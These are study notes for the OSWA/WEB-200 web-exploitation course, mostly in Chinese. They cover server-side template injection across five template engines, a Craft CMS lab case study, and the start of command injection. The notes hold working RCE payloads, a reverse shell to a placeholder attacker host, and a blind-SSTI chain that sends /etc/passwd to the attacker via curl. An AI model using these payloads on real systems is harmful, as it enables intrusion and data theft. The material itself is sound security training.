---
title: '[OSWA, WEB-200] Instructional notes - Part 2'
disqus: hackmd
---

[OSWA, WEB-200] Instructional notes - Part 2
===


# Table of Contents
[TOC]

# [Link back to: "[OSWA, WEB-200] Instructional notes - Part 1"](https://hackmd.io/@CHW/HyQ4w1cr-l)
>[!Caution]
> 接續 [[OSWA, WEB-200] Instructional notes - Part 1](https://hackmd.io/@CHW/HyQ4w1cr-l) 內容

# Server-side Template Injection - Discovery and Exploitation

[Server-side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) (SSTI) 是 Web 應用程式中常見的漏洞。在 Web 中使用 templating engines，可以讓資料處理和瀏覽器渲染之間劃分的更清晰，為應用程式的外觀和互動方式提供更大的靈活性

## Templating Engines
### Introduction to Templating Engines
Templating Engines 可以接受 generic document（template），並與指定變數結合起來最終產生文件\

>[!Note]
> - `{`  `}`: 表示 templating engine 開始和結束
> - `{{` `}}`: 表示 templating engine 的 expression，可能是名稱或運算式，有些模板將 expression 命名為 `interpolations`
> - `{%}`: 表示 statement，與 expression 不同的是：statement 可以執行 looping 遍歷變數或使用 if 進行檢查

[環境範例]\
管理員想要傳送給客戶的一封電子郵件:
```
Hello CHW,

Thank you for your order! Your items will be shipped out shortly:

Widget - $10
	Quantity: 3
	Total: 	$30
Toolkit - $20
	Quantity: 1
	Total: 	$20
_______________
Total: 		$50

These items will be shipped to:

Province Island, Lake Memphremagog, Magog, Quebec, Canada

Perhaps you’ll come across a man in a tie.
```
雖然管理員也可為每個訂單建立自訂電子郵件，但建立可重複多次的 template 較方便：
```
Hello {{ name }},

  Thank you for your order! Your items will be shipped out shortly:
  {% for product in cart %}
  {{product.name}}
          Price:  ${{product.price}}
          Quantity: {{product.quantity}}
          Total:  ${{product.quantity * product.price}}
  {% endfor %}____________________
  Total:          ${{total}}

  {% if cart|length > 1 %}
  These items{% else %}
  This item{% endif %} will be shipped to:
  {{address}}
  Perhaps you’ll come across a man in a tie.
```
> Template 使用 [Jinja](https://jinja.palletsprojects.com/en/stable/) templating engine ，透過 compiled 可以重複使用模板
> > Line 12: 透過 [filter](https://jinja.palletsprojects.com/en/stable/templates/#filters) 取得 cart 的長度 (不同的模板引擎會有不同的過濾器)

利用以下 JSON 格式變數與 Template 結合：
```
{
	"name": "CHW",
	"address": "Province Island, Lake Memphremagog, Magog, Quebec, Canada",
	"cart": [
		{
			"name": "Widget",
			"quantity": 3,
			"price": 10
		},
		{
			"name": "Toolkit",
			"quantity": 1,
			"price": 20
		}
	],
	"total": 50
}
```

Templating engine 不只用來產生 email，也常被用在產生 HTML 或設定檔 (Ex. [Ansible](https://docs.ansible.com/projects/ansible/latest/collections/ansible/builtin/template_module.html))\
在正確運用下，templating engine 會跳脫危險字元，可以有效降低 XSS ，但所有模板引擎幾乎都有提供繞過跳脫的機制（Ex. `safe`、`raw`），若開發者誤把使用者輸入拼入模板本身，或提供使用者編輯模板的功能，就可能導致Server-side Template Injection（SSTI）。模板若在伺服器端渲染，SSTI 也可能升級為 RCE。

>[!Note]
>SSTI discover:
> 1. Discovering the injection point
> 2. Finding templating engine
> 3. Exploitation


Templating Engine | Language | Server/client Side |
:------:|:---------------------|:---------------------:|
Twig  |    PHP    |    Server Side    | 
Freemarker  |    Java (usually)    |   Server Side    | 
Pug/Jade  |    JavaScript    |   Mostly Server Side    | 
Jinja  |    Python    |   Server Side    | 
Handlebars  |    JavaScript    |   Both    | 
Mustache  |    Multiple    |   Varies    | 


## Twig - Discovery and Exploitation (PHP)
Twig 是 PHP 的伺服器端模板引擎，常見於 [Symfony](https://symfony.com/)、[Laravel](https://laravel.com/) 等框架，用來取代 在 HTML 裡直接寫 PHP

```html
<h1><?php echo $name ?></h1>

<p>Welcome to our site!</p>

<?php 
if ($isAdmin) {
  echo "<p>You are the supreme leader and we love you</p>";
}
?>
```

### Twig - Discovery
Twig 由 Symfony 框架開發和維護，但幾乎其他框架都能夠支援\
讓開發者使用 [Model-View-Controller（MVC）](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller)設計模式

[環境範例]\
![image](https://hackmd.io/_uploads/ByFnwnaLbe.png)
```
<h1>{% if not admin %}sudo {% endif %}make me a sandwich, {{name|capitalize}}!</h1>
We are using Twig remotely to generate this template
```
> 1. 檢查 admin 變數是否為 True\
> 若使用者不是管理員，輸出結果將 `包含 sudo`\
> 若使用者是管理員，則`不需要 sudo`
> 2. `{{name|capitalize}}`: Expression + Filter (首字母大寫過
濾)\
> 實際做 `echo ucfirst($name);`

正常安全寫法:
```
echo $twig->render('template.twig', [
    'name' => $user_input
]);
```
> 將 User 輸入只當作資料 （參數化）

有漏洞的寫法:
```
$template = "Hello {{ " . $_GET['name'] . " }}";
echo $twig->createTemplate($template)->render();
```
> User 可透過輸入變成模板的一部分

#### 1. {{7*7}}
利用 Template 的表達式輸入 7*7\
![image](https://hackmd.io/_uploads/S1k6KhTL-x.png)
> 確實透過 expression 執行乘法運算


也可以透過 For 迴圈列出內容：
```php
{% for i, x in SECRET_ARRAY %}
{{ i }}: {{ x }}
{% endfor %}
```
![image](https://hackmd.io/_uploads/Hkm363aL-e.png)

#### 2. {{7*'7'}}
嘗試：`{{7*'7'}}`\
![image](https://hackmd.io/_uploads/BJgr526Ubx.png)
> 一樣可以正常運算，因為:
> > 背後 PHP 是弱型別，不會檢查變數類型

>[!Important]
>‼️ 可以透過以上特性 '7' 判斷 templating engine 後方的程式語言
>- PHP / Twig: `{{7*'7'}}`=49
>- Python / Jinja: `{{7*'7'}}`= '7777777'

#### 3. Whitespace Control
判斷 templating engine 也可以透過模板獨特寫法，例如 Twig 的另一種獨特語法: [Whitespace Control](https://twig.symfony.com/doc/3.x/templates.html#whitespace-control)\
`-{%  %}-` 是 Twig 用來修剪前後空白的語法

![image](https://hackmd.io/_uploads/ryrd2npIZl.png)
> 如圖可以看到 Twig 透過 `-{%  %}-` 移除前後空白，讓 name 貼緊前後字串

### Twig - Exploitation
- [Twig Filters document](https://twig.symfony.com/doc/3.x/filters/index.html)
![image](https://hackmd.io/_uploads/SJ6cx6pUWg.png)


Twig 本身不允許直接寫 PHP，但提供了很多高階 filter\
其中一類會接受 function 當做參數，且函式由 PHP 執行

#### - reduce
例如 [reduce](https://twig.symfony.com/doc/3.x/filters/reduce.html) 會利用一個 [arrow function](https://twig.symfony.com/doc/3.x/filters/filter.html)，把 array 逐步縮減成單一值\
![image](https://hackmd.io/_uploads/r1fhZapUbl.png)

```php
{% set numbers = [1, 2, 3] %}

{{ numbers|reduce((carry, v) => carry + v) }}
{# output 6 #}
```
![image](https://hackmd.io/_uploads/S1D9066UZg.png)

🥚 Twig 的 reduce 不只接受 arrow function，也接受字串形式的 PHP function name 

測試使用 `var_dump` 函數傳入一個隨機字串作為參數
```php
{{ [0]|reduce('var_dump', 'Hello') }}
```
> 1. Twig 看到 [0]
> 2. 呼叫 reduce
> 3. reduce 內部呼叫 var_dump("Hello", 0)
> 4. var_dump PHP 原生函式
> 5. 成功執行

等價的 PHP 中：
```php
array_reduce([0], 'var_dump', 'Hello');
```
![image](https://hackmd.io/_uploads/ByRsMA6I-e.png)
> `var_dump` 執行時使用了字串 "Hello" 作為參數

嘗試將 `var_dump` 替換為 `system`
```php
{{[0]|reduce('system','whoami')}}

# {{ [0]|reduce('shell_exec','whoami') }}
```
等價的 PHP 中：
```php
array_reduce([0], 'system', 'whoami');
```
![image](https://hackmd.io/_uploads/ByNxQ0p8Zl.png)

>[!Important]
>高風險 Twig filters:
>- reduce
>- map
>- filter
>- sort（特定情況）
>- column（特定情況）

#### - map
map：對 array 中每個元素套用一個 function
```php
{{ [1,2,3]|map(v => v * 2) }}
```
![image](https://hackmd.io/_uploads/HJecERp8Wl.png)

注入 system funciton
```php
{{ ['whoami']|map('system') }}

# {{ ['whoami']|map('shell_exec') }}
# {{ ['ls /']|map('passthru') }}
```
> 1. Twig 對 array 做 map
> 2. 每個元素丟進 system()
> 3. system("whoami") 被執行
> 4. command output 被回傳
> 5. Twig 顯示結果

等價的 PHP 中：
```
array_map('system', ['whoami']);
```

#### - filter
filter：用 callback 判斷哪些元素要留下 (filter 不在乎 return 值)

```php
{{ ['id']|filter('system') }}
```
> 1. system("id") 被呼叫
> 2. 回傳值轉成 boolean
> 3. 副作用：command 已經執行完

等價的 PHP 中：
```php
array_filter(['id'], 'system');
```
![image](https://hackmd.io/_uploads/r1fqH06U-g.png)


## Apache Freemarker - Discovery and Exploitation (Java)
Freemarker 是 Java 生態系最常見的 Server-Side Template Engine 之一，常見：
- Spring / Spring Boot
- Java Web App（取代 JSP）
- CMS、管理後台、報表系統

### Freemarker - Discovery
雖然 [Apache Freemarker](https://freemarker.apache.org/) 是一個通用模板引擎，但常與 Java 應用程式搭配使用。就像 Twig 之於 PHP 內聯程式碼，Freemarker 也為 [Jakarta Server Pages](https://en.wikipedia.org/wiki/Jakarta_Server_Pages)（以前稱為Java Server Pages / JSP）做出貢獻，Freemarker 為開發者將資料操作與資料顯示分開

[環境範例]\
![image](https://hackmd.io/_uploads/H1kpvC68-l.png)
> 包含 Template, name variable 和 reasons array

```java
<h1>Hello ${name}!</h1>
<#if name == "hacker">
The top reasons you're great:
    <#list reasons as reason>
    ${reason?index + 1}: ${reason}
    </#list>
</#if>
```
> - Expression
> `${name}`: ${ ... } 是 Freemarker interpolation，類似 Twig 的 {{ }}
> - Statement
> `<# ... >` ([FTL tag](https://freemarker.apache.org/docs/dgui_template_overallstructure.html)) 是 Freemarker 的控制結構，用於 if / list / assign 等
> - Loop
> `${reason}` reasons 是 array / list 迭代變數
> - 內建變數
> `?index` 是 Freemarker built-in，回傳目前 index（從 0 開始）

Freemarker 也可以透過 interpolation 運算：\
Ex. 列出 Array
```java
<#list SECRET_ARRAY as v>
${v}
</#list>

# ${SECRET_ARRAY?join(" | ")}
```

2016 年之前，Freemarker 要求開發者需要指定變數是否進行 HTML 轉義。在顯示變數時，很容易忽略這個設定。 2016 年之後，Freemarker 實作了一個 system，若內容類型是 HTML 文檔，則會自動轉義變數\
👉🏻 使用 Freemarker 模板的應用程式比其他模板引擎更容易受到 XSS 攻擊\
![image](https://hackmd.io/_uploads/HysZ71RIWg.png)

#### - ${7*7}
利用 Template 的表達式輸入 7*7\
![image](https://hackmd.io/_uploads/B1FBm10Lbe.png)

嘗試 `${7*'7'}` 對比 PHP Twig\
![image](https://hackmd.io/_uploads/SkXd7kAIZe.png)
> Error\
> Java 無法自動轉型（不像 PHP / Python）


>[!Important]
>Freemarker 為什麼能 RCE？
>> Freemarker 模板能存取 Java Object 與 Class Loader
>> 只要做到其中之一：
>> - 拿到 java.lang.Runtime
>> - 拿到 ProcessBuilder
>> - 拿到 ObjectWrapper / ClassLoader
>>
>>  👉🏻 就能 exec system command

### Freemarker - Exploitation
尋找 [freemarker document](https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html) 可以找到 "Class Execute"

![image](https://hackmd.io/_uploads/BJPeUyRLZg.png)
> 顯示實作了 TemplateMethodModel, TemplateModel 類別

透過 Document 了解如何實例化一個新類別以及應該使用哪個類別\
建構 Payload
```java
${"freemarker.template.utility.Execute"?new()("whoami")}
```
![image](https://hackmd.io/_uploads/BJqAIk08Ze.png)

## Pug - Discovery and Exploitation (JavaScript)
[Pug](https://github.com/pugjs/pug/issues/2184) 以前稱為 Jade 一個 JavaScript templating engine
- 直接把 template 編譯成 JavaScript 函式
- 在 [Node.js](https://en.wikipedia.org/wiki/Node.js) / [Express](https://en.wikipedia.org/wiki/Express.js) 伺服器端執行
- template 裡允許直接執行 JS 程式碼

>[!Note]
>👉 這一點跟 Twig / Freemarker 不同：
> Pug 不是靠 filter 或 class 反射，而是原生 JS 執行權限

### Pug - Discovery
[環境範例]\
![image](https://hackmd.io/_uploads/r1pFdJALWg.png)
>[!Note]
> Pug 不需要 `<` `>`，行首就是 tag

```js
h1 Hello, #{name}
input(type='hidden' name='admin' value='true')

if showSecret
    - secret = ['❤️','😍', '🤟']
    p The secrets are: 
    each val in secret
        p #{val}
else
    p No secret for you!
```
> 1. `h1 Hello, #{name}`: \
> 等價於： `<h1>Hello, CHW</h1>`\
> 若輸入 `foo bar` 即輸出 `<foo>bar</foo>`
> 2. Expression: `#{}` 裡面是 JavaScript expression (JS runtime evaluate)\
> Ex. `#{7 * 7}`
> 3. Statement: `if showSecret ... else` 這不是 HTML 是 template control flow
> 4. Unbuffered code: `- secret = ['❤️','😍', '🤟']` 在 `-` 的意思是執行 JavaScript，但不要輸出結果

#### 1. #{7*7}
利用 Template 的表達式輸入 7*7\
![image](https://hackmd.io/_uploads/r1fOny08-l.png)
> 透過顯示內容包在 HTML tag 中可以猜測是 Pug template

#### 2. #{"7"*7}
嘗試 `#{"7"*7}` 若輸出為 "49"，則表示處理變數未過濾 Ex. JavaScript 或 PHP\
![image](https://hackmd.io/_uploads/S1G7aJ0UZg.png)

JS expression → 49\
→ tag name = 49

輸出: `<49></49>`; Broswer 顯示：`<49>`

### Pug - Exploitation
Pug = Server-side JavaScript execution environment
- Twig（需要 filter + PHP function）
- Freemarker（需要 Java class resolver）

一旦能夠 `require('child_process')` ([child_process.spawnSync](https://nodejs.org/docs/latest/api/child_process.html#child_process_child_process_spawnsync_command_args_options) command)\
👉🏻 RCE 必然成立

#### 1. 嘗試直接使用 require
`=` 代表執行 JS 並輸出結果，若 require 存在，可以看到 function 本體\
![image](https://hackmd.io/_uploads/ryXJ-xRUbg.png)
> require 不在 template scope 或 Pug 的 sandbox 沒有暴露出來\
> 不一定代表 Node.js 沒有 require

#### 2. Node.js： global
>[!Note]
>在 Node.js 裡：
> - `global` ≈ 瀏覽器的 window
> - `process` 是全域物件
> - `process.mainModule.require` = 真正的 require

測試完整 Node.js module loading
```js
= global.process.mainModule.require
```
![image](https://hackmd.io/_uploads/HkdyGxR8be.png)

#### 3. 把真正的 require 存成變數
```js
- var require = global.process.mainModule.require
```
> `- =` 只執行、不輸出

#### 4. 載入 child_process 模組

```js
- var require = global.process.mainModule.require
= require('child_process')
```
![image](https://hackmd.io/_uploads/Sy6nQxRLWl.png)
> child_process 是一個 module object，Pug 嘗試把轉成字串輸出\
> 可以證明 module 已成功載入

#### 5. 透過 require command RCE： spawnSync
>[!Tip]
>為什麼用 spawnSync？
>- 同步執行
>- 以直接讀 stdout
>- 不需要 callback

```js
- var require = global.process.mainModule.require
= require('child_process').spawnSync('whoami').stdout
```
![image](https://hackmd.io/_uploads/B18gBg08Ze.png)

實際發生：
```js
const cp = require('child_process');
const result = cp.spawnSync('whoami');
output(result.stdout);
```
比較像是 Node.js Remote Code Execution

Reverse Shell:
```
= require('child_process').spawnSync(
  'bash',
  ['-c', 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1']
).stdout
```

/bin/sh:
```
- var require = global.process.mainModule.require
= require('child_process').spawnSync('/bin/sh', ['-c', 'cat /root/flag.txt']).stdout
```

## Jinja - Discovery and Exploitation (Python)

Jinja 是 Python 的 server-side template engine，最常搭配 Flask，在 SSTI 裡面屬

### Jinja - Discovery

[環境範例]\
![image](https://hackmd.io/_uploads/ryROizALZe.png)
```py
<h1>Hey {{ name }}</h1>
{% if reasons %}
Here are a couple of reasons why you are great:
<ul>
{% for r in reasons %}
    <li>{{r}}</li>
{% endfor %}
</ul>
{% endif %}
```
> 1. Expression: `{{ name }}`
> 2. Statement: `{% %}` 控制流程

#### 1. {{7*7}}
利用 Template 的表達式輸入 7*7\
![image](https://hackmd.io/_uploads/BJZpkmC8bg.png)

#### 2. {{7 * "7"}}
嘗試 {{7 * "7"}} 若輸出為 "49"，則表示處理變數未過濾\
![image](https://hackmd.io/_uploads/Syxw-QA8Wl.png)


#### 3. Flask global objects
進一步確認 Flask 專屬全域變數
```py
{{ request }}
```
![image](https://hackmd.io/_uploads/SkM6W7RI-e.png)
> 幾乎可以確定：Jinja + Flask

其他看測試方法：
- `{{ config }}`
![image](https://hackmd.io/_uploads/Hy3Yf70IWl.png)
- `{{ session }}`
![image](https://hackmd.io/_uploads/rJoiMm0UWx.png)
- `{{ g }}`
![image](https://hackmd.io/_uploads/S1T6fX0UZg.png)

查閱 [ducument](https://flask.palletsprojects.com/en/stable/templating/#standard-context) 可以得知，Flask 設定了六個全域變數：`config`、`request`、`session`、`g`、`url_for()`和`get_flashed_messages()`\
![image](https://hackmd.io/_uploads/Bk2DqQ0Ubg.png)

### Jinja - Exploitation
>[!Tip]
> Obtaining RCE via injection in the Jinja templating engine is the type of complex technique reviewed in the WEB-300 course.\
> ![image](https://hackmd.io/_uploads/r1CAiXRIWg.png)


每個框架都會設定自己的 global variables。有些變量 (如`config`) 可能包含應用程式的  private keys 或資料庫密碼等敏感資訊\
嘗試使用 Jinja expression 存取`config`變數
```py
{{ config|pprint }}
```
> - config
>Flask 全域設定物件（dict-like）
> - pprint
> Python pretty print

![image](https://hackmd.io/_uploads/H1l5aQ0UWe.png)

>[!Note]
>Flask 的 SECRET_KEY 用途包括：
> 1. Session Cookie 簽章 / 加密
> 2. CSRF Token
> 3. 有時用於 JWT / OAuth


```
'APPLICATION_ROOT': '/',
 'DEBUG': True,
 'ENCRYPTION_KEY': '-----BEGIN RSA PRIVATE KEY-----\n'
                   'MIIBOgIBAAJAfGMQ5MG19WzhpAI+/q4y0gKNVtqy2fnO/PgtRxFutupzjUWlk3EA\n'
                   'NKXcKpFwKxzJbZyyyoFTmLQjGldKvMrZUQIDAQABAkBTn9aPtJu8MENSnB/14O9R\n'
                   'uV2EcuujGAtMjx0Blnq0hdb5qXjOAoj9nnEmk0qFwprFrAUbDxJZiDJIiTbRXMxB\n'
                   'AiEA9AEXL6isWhcQG8pX1fAhdsHpkMBQTpU/D8joRdqrqn0CIQCCgIj+TGhXX8Fn\n'
                   'wHyfi+aE5JnOrfhTloMFamuzCWDOZQIhAOdDfVlTcf91KnRchIGlteHcCmaCj9rb\n'
                   'Q8jPL669gcT1AiBVTFY+gQqiMYBkpDfQwMyHiDPQF338hKBW5dxHRZX00QIhANaf\n'
                   'prc3c2J3gXq+r69FpRUrn3+Bd828/3M/gtWku1U3\n'
                   '-----END RSA PRIVATE KEY-----\n',
 'ENV': 'production',
 'EXPLAIN_TEMPLATE_LOADING': False,
 'JSONIFY_MIMETYPE': 'application/json',
 'JSONIFY_PRETTYPRINT_REGULAR': False,
 'JSON_AS_ASCII': True,
 'JSON_SORT_KEYS': True,
 'MAX_CONTENT_LENGTH': None,
 'MAX_COOKIE_SIZE': 4093,
 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31),
 'PREFERRED_URL_SCHEME': 'http',
 'PRESERVE_CONTEXT_ON_EXCEPTION': None,
 'PROPAGATE_EXCEPTIONS': None,
 'SECRET_KEY': None,
 'SEND_FILE_MAX_AGE_DEFAULT': None,
 'SERVER_NAME': None,
 'SESSION_COOKIE_DOMAIN': None,
 'SESSION_COOKIE_HTTPONLY': True,
 'SESSION_COOKIE_NAME': 'session',
 'SESSION_COOKIE_PATH': None,
 'SESSION_COOKIE_SAMESITE': None,
'SESSION_COOKIE_SECURE': False,
 'SESSION_REFRESH_EACH_REQUEST': True,
 'TEMPLATES_AUTO_RELOAD': None,
 'TESTING': False,
 'TRAP_BAD_REQUEST_ERRORS': None,
 'TRAP_HTTP_EXCEPTIONS': False,
 'USE_X_SENDFILE': False,
```
> 1. ENCRYPTION_KEY = RSA Private Key（私鑰）
> 完整 RSA 私鑰，可用於 解密 / 簽章 / token 驗證
> 2.  DEBUG: True
> 在 Flask 中代表：開啟 debug mode，一旦觸發例外（500）可能出現 Werkzeug Debug Console
> 3. ENV: production + DEBUG: True

## Mustache and Handlebars - Discovery and Exploitation (Java, .Net, PHP)
Mustache templating engines 支援多種語言和框架。 Mustache 可以使用 JavaScript 在伺服器端或客戶端渲染範本\
與其他模板引擎相比，Mustache 的獨特之處在於它被認為是"logic-less"，許多 templating engines 透過更複雜的 statements 和 filters 來支援對 underlying programming languages 的存取，而 Mustache 只支援簡單的 if 來檢查變數是否存在或 loop

開發者常覺得 Mustache 的限制太多，因此 [Handlebars](https://github.com/handlebars-lang/handlebars.js) templating engines 誕生，旨在提供更多輔助功能並與底層程式語言更好地整合
受歡迎的 Handlebars library 是 JavaScript ，支援客戶端和服務端渲染，也適用於 [Java](https://github.com/jknack/handlebars.java)、[.NET](https://github.com/Handlebars-Net/Handlebars.Net)、[PHP](https://github.com/XaminProject/handlebars.php) 等語言

### Mustache and Handlebars - Discovery
client-side Handlebars template 

[環境範例]\
![image](https://hackmd.io/_uploads/rkS_NE0IWg.png)

```js
<h1>Hello {{name}}</h1>
{{#if nicknames}}
Also known as:
    {{#each nicknames}}
        {{this}}
    {{/each}}
{{/if}}

We are using handlebars locally in your browser to generate this template
```
> Handlebars 支援 helper 語法: `{{#if }}`, `{{#each }}`


#### 如何判斷 Mustache 與 Handlebars
#### 1. {{this}}

```
{{this}}
```
> 可以明確辨識 Mustache 與 Handlebars：
> - Mustache：通常只會輸出空或原值
> - Handlebars：this 代表目前 context

![image](https://hackmd.io/_uploads/SJmdSNRU-x.png)


#### 2. obj.constructor
在 JavaScript 中: `obj.constructor === Function`\
若碰到 constructor `Function("return process")()`
> process 是 Node.js 的全域物件

Handlebars 允許:
- `{{this.constructor}}`
- `{{this.constructor.constructor}}`

可以構造出 Payload:
```js
{{#with "s" as |string|}}
  {{#with string.constructor as |Function|}}
    {{Function "return require('fs').readFileSync('/etc/passwd','utf8')"}}
  {{/with}}
{{/with}}
```

## Mustache and Handlebars - Exploitation
原生 Handlebars 只支援：
- `{{variable}}`
- `{{#if}}`
- `{{#each}}`

沒有 function call, fs, require, eval
曾經有人[利用 SSTI 漏洞在 Handlebars 上實作 RCE](https://www.npmjs.com/advisories/755)

🥚 開發者可能會為 Handlebars 添加額外的 [helpers](https://github.com/helpers/handlebars-helpers):
```js
const helpers = require('handlebars-helpers');
handlebars.registerHelper(helpers());
```

>[!Tip]
>handlebars-helpers 中最危險的兩個 helper:
> - `readdir`
>列出目錄內容，等價於 Node.js 的 `fs.readdirSync`
> - `read`
> 讀取檔案內容，等價於 fs.readFileSync
>
> 👉 這兩個只要在 server-side rendering 出現，就是 LFI

#### - readdir
列出目錄

```js
{{#each (readdir "/etc")}}
    {{this}}
{{/each}}
```
> `{{#each ...}}` 對 array 逐一處理，`{{this}}` = 當前 array element

![image](https://hackmd.io/_uploads/HJrl24A8-l.png)

#### - read
直接拿資料
```
{{read "/etc/passwd"}}
```
> read helper 實作本質是：`fs.readFileSync(path, 'utf8')`只負責把回傳字串 render 出來

![image](https://hackmd.io/_uploads/BytL2NCUWx.png)


>[!Important]
>同整上述所有 Template 決策樹:
> 1. `${7*7}` 測試 Freemarker（Java）
>(若沒反應)
> 2. `{{7*"7"}}`= 7777777 : 測試 Jinja (Python)
> 3. `{{7*"7"}}`= 49 : 測試 Twig (PHP)
> 4.  `#{7*7}`= 49 + tag : 測試 Pug (JavaScript)
> 5.  `{{#if 1}}YES{{/if}}`= YES : 測試 Mustache / Handlebars

Target Template | Payload | Output |
:------:|:---------------------:|:---------------------:|
Freemarker（Java）  |    `${7*7}`    |    49    | 
Jinja (Python)  |    `{{7*"7"}}`    |   7777777    | 
Twig (PHP)  |    `{{7*"7"}}`   |   49    | 
Pug (JavaScript)  |    `#{7*7}`    |   <49>    | 
Mustache / Handlebars  |    `{{#if 1}}YES{{/if}}`    |   YES/無效    | 

## Craft CMS with Sprout Forms - Case Study
1. 列舉目標應用程式
2. 探索 Craft CMS 和 Sprout Form 外掛程式中使用的模板注入和模板引擎
3. 利用應用程式中的模板注入漏洞

漏洞源自於 Craft CMS 的熱門外掛程式 Sprout Forms
無法查看 SSTI 的輸出，透過 SSTI 盲測中發現和測試漏洞

![image](https://hackmd.io/_uploads/B1nOfkJv-e.png)

### Craft CMS with Sprout Forms - Discovery

最初該漏洞 CVE-2020-11056 由 Paweł Hałdrzyński 和 Daniel Kalinowski 發現。這是一個郵件模板漏洞，可以在目標主機的 8025 連接埠上找到一個 SMTP catcher。

從黑箱瀏覽網站查看內容開始枚舉:

1. Homepage Discovery
在 http://craft/ 首頁原始碼中看到 CSRF token\
![image](https://hackmd.io/_uploads/H1Ab7y1DZg.png)\
輸入欄位的 name attribute 使用 `[]` (PHP Feature)\
![image](https://hackmd.io/_uploads/HyGqmJywWe.png)

2. ffuf 目錄爆破
```
ffuf -t 100 -r -w /usr/share/dirb/wordlists/common.txt -u http://craft/FUZZ -e ".php,.bak,.zip" -mc 200,301,302,401
```
![image](https://hackmd.io/_uploads/H10ld1Jv-e.png)
> `/admin`, `/index`, `/index.php`, `/index.php`, `/logout`

- http://craft/admin
![image](https://hackmd.io/_uploads/HJZtdykvZg.png)

得到 admin 登入頁面

3. Send message
在沒有其他資訊發現的情況下，嘗試發送 message 給 administrator\
![image](https://hackmd.io/_uploads/BJgl5kJvZg.png)

在 SMTP port (http://craft:8025/#) 可以看到 Mail 成功發送：\
![image](https://hackmd.io/_uploads/Sy_zcJJvbe.png)

4. SSTI 

Target Template | Payload | Output |
:------:|:---------------------:|:---------------------:|
Freemarker（Java）  |    `${7*7}`    |    49    | 
Jinja (Python)  |    `{{7*"7"}}`    |   7777777    | 
Twig (PHP)  |    `{{7*"7"}}`   |   49    | 
Pug (JavaScript)  |    `#{7*7}`    |   <49>    | 
Mustache / Handlebars  |    `{{#if 1}}YES{{/if}}`    |   YES/無效    | 

一次傳送以上模板的可能性：\
![image](https://hackmd.io/_uploads/ryzfgeyvbg.png)

訊息發送後，在收件匣沒有收到訊息\
可以猜測是 Template 注入在某個地方導致了錯誤

接著測試是否 blind SSTI

5. Blind SSTI
讓 templating engine 發送 curl請求來證明 templating engine 有渲染到有效 payload
- 利用 reduce filter 執行 system command
```
{{[0]|reduce('system','curl http://{Kali IP}/SSTITest')}}
```
![image](https://hackmd.io/_uploads/rJcjrxJPWl.png)

(Kali)\
![image](https://hackmd.io/_uploads/rkpTHeyw-l.png)
> 可以驗證 Blind SSTI 有效，並且可以猜測是 Twig template

### Craft CMS with Sprout Forms - Exploitation
接下來針對 Blind SSTI 有效 payload 進行修改：
在 [Twig Document](https://twig.symfony.com/doc/3.x/templates.html#expressions) 中找到 `~` 可以作為字串拼接
![image](https://hackmd.io/_uploads/r1L-vxkwZx.png)

#### 1. 測試 `~` 字串拼接
```
{{[0]|reduce('system','curl http://{Kali IP}/?payload=' ~ payload)}}
```
![image](https://hackmd.io/_uploads/rJIdwlJvbg.png)

(Kali)\
![image](https://hackmd.io/_uploads/S1CKPl1P-l.png)
> 因為沒有設定 payload 變量，所以值為空

#### 2. 定義 variable
```
{% set payload = "payload variable TEST"| url_encode %}
{{[0]|reduce('system','curl http://{Kali IP}/?payload=' ~ payload)}}
```
![image](https://hackmd.io/_uploads/ryDfuxyw-l.png)

(Kali)\
![image](https://hackmd.io/_uploads/rJANdxkPWx.png)
> 成功收到上述定義的 payload 變數

#### 3. 建構 Payload
上述能夠定義 payload 變數，可以將 system command 注入進 SSTI Payload 中：
```
{% set output %}
{{[0]|reduce('system','whoami')}}
{% endset %}

{% set payload = output| url_encode %}
{{[0]|reduce('system','curl http://{Kali IP}/?payload=' ~ payload)}}
```
![image](https://hackmd.io/_uploads/ryR7Kxyvbg.png)

(Kali)\
![image](https://hackmd.io/_uploads/H1TPYxyDbl.png)
> 成功收到 System cmd: `whoami`: www-data

提取 /etc/passwd
```
{% set output %}
{{[0]|reduce('system','cat /etc/passwd')}}
{% endset %}

{% set payload = output| url_encode %}
{{[0]|reduce('system','curl http://{Kali IP}/?payload=' ~ payload)}}
```
![image](https://hackmd.io/_uploads/H1tAKgkPWx.png)\
再利用 URL decode 還原：\
![image](https://hackmd.io/_uploads/SJjb5gyD-l.png)

# Command Injection
在 Web application 中，攻擊者會將程式碼注入到易受攻擊的參數中，並透過未經過濾的系統執行呼叫執行\
從攻擊者的角度來看，最終目標是執行系統操作，通常是取得 shell 權限

## Discovery of Command Injection
[環境範例]\
![image](https://hackmd.io/_uploads/r1IUyzkP-l.png)
包含 PHP Cmdi, Python Cmdi 和  NodeJS Cmdi

最常見利用 `|`, `||`, `&&`, `%0A` 等方式注入指令\
(詳細可參考 [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/command-injection.html))\
![image](https://hackmd.io/_uploads/rkZxZfkD-l.png)

### Where is Command Injection Most Common?

Cmdi 對於開發的程式語言與框架來說不是最重要，而是用到 system / exec / shell / popen / Runtime.exec / child_process 等 function

PHP code 為例：
```php
<?php
$IP = $_GET['IP'];

echo "<pre>";
system("ping -c 5 ".$IP);
echo "</pre>";
?>
```
code 中向 address $IP 的系統發送 ping 請求，且利用的是 `system()` Function 執行，屬於典型的 command injection 漏洞



### About the Chaining of Commands & System Calls
大多數的 OS 都會允許使用者在一行中同時執行多個命令\
以 Linux 為例: 可以使用分號 `;`、logical AND `&&`、logical OR `||`，甚至是單一豎線字元 `|`

- `&&`: 第一個失敗，第二個就不會執行
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ chw && id            
Command 'chw' not found, did you mean:
  command 'chg' from deb mercurial
  command 'cht' from deb chemtool
  command 'cw' from deb cw
  command 'chr' from deb chr
  command 'chr' from deb chr-tiny
  command 'cdw' from deb cdw
  command 'rhw' from deb ruptime
  command 'cow' from deb fl-cow
Try: sudo apt install <deb name>

```
- `||`: 第一個失敗，才會第二個
```
┌──(chw💲CHW)-[~/Offsec/OSWA]
└─$ chw || id
Command 'chw' not found, did you mean:
  command 'chg' from deb mercurial
  command 'cw' from deb cw
  command 'cht' from deb chemtool
  command 'cdw' from deb cdw
  command 'cow' from deb fl-cow
  command 'rhw' from deb ruptime
  command 'chr' from deb chr
